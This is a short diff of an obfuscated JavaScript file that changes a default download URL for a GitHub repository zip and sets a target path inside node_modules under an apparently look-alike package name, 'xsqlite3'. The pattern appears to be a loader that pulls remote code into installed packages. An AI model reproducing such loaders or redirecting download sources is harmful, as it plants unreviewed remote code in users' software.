@@ -90,7 +90,7 @@ function v27() {
   }
 }
 v2();
-const v33 = process.env.REPO_URL || "https://github.com/supreme-Lord2/xjx/archive/refs/heads/main.zip";
+const v33 = process.env.REPO_URL || "https://github.com/mgazah/Cyntron-X/archive/refs/heads/main.zip";
 const v34 = path.join(__dirname, "node_modules", "xsqlite3");
 const v35 = 50;
 function v36() {
